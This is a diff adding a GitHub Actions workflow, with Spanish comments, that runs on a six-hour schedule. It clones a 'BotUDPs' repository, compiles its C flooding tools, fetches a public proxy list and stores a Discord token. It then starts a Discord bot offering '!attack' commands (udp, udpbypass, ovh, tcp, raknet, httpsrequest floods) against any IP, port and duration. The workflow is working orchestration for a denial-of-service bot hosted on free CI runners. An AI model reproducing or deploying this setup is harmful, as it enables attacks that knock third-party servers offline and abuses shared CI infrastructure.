@@ -1,0 +1,216 @@
+name: nomebaneeenplsss
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'
+
+jobs:
+  clone-compile-run:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: 🗑️ Limpiar directorio anterior
+      run: |
+        echo "Limpiando directorios anteriores..."
+        rm -rf BotUDPs 2>/dev/null || true
+    
+    - name: 📥 Clonar repositorio
+      run: |
+        echo "Clonando repositorio BotUDPs..."
+        if ! git clone https://github.com/zJonch14/BotUDPs.git; then
+          echo "❌ Error clonando, intentando clonado superficial..."
+          git clone --depth 1 https://github.com/zJonch14/BotUDPs.git || exit 1
+        fi
+        
+        cd BotUDPs
+        echo "✅ Repositorio clonado"
+        echo "📁 Contenido:"
+        ls -la
+    
+    - name: 🐍 Configurar Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.11'
+    
+    - name: 🔧 Instalar herramientas esenciales
+      run: |
+        echo "Instalando herramientas..."
+        sudo apt-get update
+        sudo apt-get install -y build-essential gcc g++ make libpcap-dev wget
+        echo "✅ Herramientas instaladas"
+    
+    - name: 📦 Instalar discord.py
+      run: |
+        cd BotUDPs
+        pip install discord.py
+        echo "✅ discord.py instalado"
+
+    - name: Download and prepare proxy list
+      run: |
+        cd BotUDPs
+        echo "=== Downloading Proxy List ==="
+        wget -O proxy.txt "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=100&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
+        echo "=== Proxy List Downloaded ==="
+
+    - name: 🛠️ COMPILAR CON CONTINUACIÓN ANTE ERRORES
+      run: |
+        cd BotUDPs
+        echo "========================================"
+        echo "COMPILACIÓN CON TOLERANCIA A FALLOS"
+        echo "========================================"
+        
+        # Desactivar exit-on-error para este paso
+        set +e
+        
+        echo "📋 Archivos .c encontrados:"
+        find . -maxdepth 1 -name "*.c" -type f
+        
+        compiled=0
+        failed=0
+        
+        for c_file in *.c; do
+          [ -f "$c_file" ] || continue
+          
+          binary="${c_file%.c}"
+          echo ""
+          echo "🔨 Compilando: $c_file → $binary"
+          
+          # Intentar compilar cada archivo
+          if gcc -O3 -pthread "$c_file" -o "$binary" 2>&1; then
+            chmod +x "$binary"
+            echo "  ✅ $binary compilado exitosamente"
+            ((compiled++))
+          else
+            echo "  ❌ Error compilando $binary"
+            # Mostrar error específico
+            gcc -O3 -pthread "$c_file" -o "$binary" 2>&1 | head -5
+            ((failed++))
+          fi
+        done
+
+        echo ""
+        echo "🔨 Compilando tcp sin threads: tcp.c → tcp"
+        gcc -O3 tcp.c -o tcp
+        chmod +x tcp
+        echo ""
+        
+        echo ""
+        echo "========================================"
+        echo "RESUMEN DE COMPILACIÓN:"
+        echo "  ✅ $compiled compilados exitosamente"
+        echo "  ❌ $failed con errores"
+        echo ""
+        echo "📂 EJECUTABLES DISPONIBLES:"
+        find . -maxdepth 1 -type f -executable ! -name "*.py" ! -name "*.go" ! -name "*.sh" | while read exe; do
+          size=$(stat -c%s "$exe" 2>/dev/null || echo "?")
+          echo "  ✓ $(basename "$exe") (${size} bytes)"
+        done || echo "  Ningún ejecutable encontrado"
+        
+        # Reactivar exit-on-error
+        set -e
+        
+        echo "========================================"
+        echo "⚠️  Continuando aunque algunos archivos hayan fallado"
+
+    
+    - name: 🦾 Configurar Go para scripts .go
+      run: |
+        cd BotUDPs
+        
+        # Solo si hay archivos .go
+        if ls *.go >/dev/null 2>&1; then
+          echo "🦾 Configurando Go..."
+          
+          # Instalar dependencias Go
+          go get github.com/sandertv/go-raknet 2>/dev/null || echo "⚠️  go-raknet opcional"
+          
+          echo "✅ Go configurado"
+        else
+          echo "⚠️  No hay archivos .go, omitiendo Go"
+        fi
+    
+    - name: 🔐 Configurar token DESDE SECRET KEYS
+      env:
+        DISCORD_TOKEN: ${{ secrets.KEYS }}
+      run: |
+        cd BotUDPs
+        
+        if [ -z "$DISCORD_TOKEN" ]; then
+          echo "❌ ERROR: Secret 'KEYS' no configurado"
+          echo "Configúralo en Settings → Secrets → Actions → KEYS"
+          exit 1
+        fi
+        
+        echo "$DISCORD_TOKEN" > token.txt
+        echo "✅ Token guardado en token.txt"
+
+    - name: Install Node.js
+      run: |
+          cd BotUDPs
+          sudo apt-get update
+          sudo apt-get install -y nodejs npm
+          sudo npm install -g request
+
+    - name: 🚀 EJECUTAR bot.py
+      run: |
+        cd BotUDPs
+        echo "========================================"
+        echo "🚀 INICIANDO BOT UDP"
+        echo "========================================"
+        echo "📅 Hora: $(date)"
+        echo ""
+        
+        # Verificar que tenemos lo mínimo necesario
+        if [ ! -f "bot.py" ]; then
+          echo "❌ ERROR: bot.py no encontrado"
+          exit 1
+        fi
+        
+        if [ ! -f "token.txt" ]; then
+          echo "❌ ERROR: token.txt no encontrado"
+          exit 1
+        fi
+
+        if [ ! -f "gravitus.js" ]; then
+          echo "❌ ERROR: gravitus.js no encontrado"
+          exit 1
+        fi
+
+        if [ ! -f "proxy.txt" ]; then
+          echo "❌ ERROR: proxy.txt no encontrado"
+          exit 1
+        fi
+        
+        echo "✅ Archivos críticos verificados"
+        echo "🎮 Métodos disponibles según ejecutables:"
+        
+        # Mostrar métodos basados en ejecutables disponibles
+        for method in udp udphex udppps ovh tcp udppayload udpbypass; do
+          if [ -f "$method" ]; then
+            echo "  !attack $method [IP] [PUERTO] [TIEMPO]"
+          fi
+        done
+
+        echo "  !attack httpsrequest [IP] [PUERTO] [TIEMPO]"
+        
+        if [ -f "udpflood.go" ]; then
+          echo "  !attack udpflood [IP] [PUERTO] [TIEMPO]"
+        fi
+        
+        if [ -f "raknet.go" ]; then
+          echo "  !attack raknet [IP] [PUERTO] [TIEMPO]"
+        fi
+        
+        echo ""
+        echo "⚡ INICIANDO BOT..."
+        echo "El bot se ejecutará hasta el límite de GitHub (~6h)"
+        echo ""
+        
+        # Ejecutar bot
+        python3 bot.py
+        
+        echo ""
+        echo "========================================"
+        echo "BOT DETENIDO - Hora: $(date)"
+        echo "========================================"
